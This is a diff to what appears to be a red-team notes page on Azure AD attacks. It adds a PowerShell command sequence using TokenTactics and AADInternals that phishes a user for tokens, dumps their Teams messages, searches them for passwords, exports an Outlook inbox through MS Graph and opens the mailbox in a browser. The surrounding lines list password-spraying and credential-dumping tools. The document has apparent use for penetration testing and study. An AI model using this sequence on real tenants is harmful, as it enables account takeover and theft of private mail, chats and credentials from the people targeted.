@@ -136,6 +136,63 @@ get-aadintusermfa -AccessToken $response.access_token
 
 [![](https://aadinternals.com/images/favicon-16x16.png)Introducing a new phishing technique for compromising Office 365 accounts](https://o365blog.com/post/phishing/)
 
+
+
+**Azure AD Red Team First Action**
+
+After getting tokens of user, We can go further to look MSTeam Chats and Outlook Email and search there some credentials.
+
+Here is the step that you can find;
+
+```
+
+#Download TokenTactics from that github page https://github.com/rvrsh3ll/TokenTactics
+
+Import-Module .\TokenTactics.psd1
+
+# It will give you tokens that you will need.
+Get-AzureToken -Client MSGraph
+
+
+# Phish the user and get the tokens of user
+
+RefreshTo-MSTeamsToken -domain <domain.name> 
+
+#After getting phished get all Teams messages
+Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token
+
+
+#Search for a password in MSTeam messages
+
+Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Select-String -Pattern Password
+
+
+Connect-AzureAD -AadAccessToken $response.access_token -AccountId <email@domain.name>
+
+Get-AzureADUser
+
+# That will give you MSGraphToken variable with tokens inside
+RefreshTo-MSGraphToken -domain <domain.name>
+
+
+# Dump all emails with that command $MsGraphToken from RefreshTo-MsGraphToken commands result
+
+Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox
+
+# With that you can go and look via browser. 
+RefreshTo-SubstrateToken -domain <domain.name>
+
+# It will give you a request, follow instructions and use it in Burp and you will have
+# browser view. 
+
+Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token
+
+
+
+```
+
+
+
 ### Password Spray  <a href="#password-spray" id="password-spray"></a>
 
 After finding users on Azure AD we will try to login into their accounts this can be really noisy
@@ -153,3 +210,4 @@ Here is the some tools for testing it.
 * [o365spray](https://github.com/0xZDH/o365spray) - Username enumeration and password spraying tool aimed at Microsoft O365
 * [MFASweep](https://github.com/dafthack/MFASweep) - A tool for checking if MFA is enabled on multiple Microsoft Services Resources
 * [adconnectdump](https://github.com/fox-it/adconnectdump) - Dump Azure AD Connect credentials for Azure AD and Active Directory
+
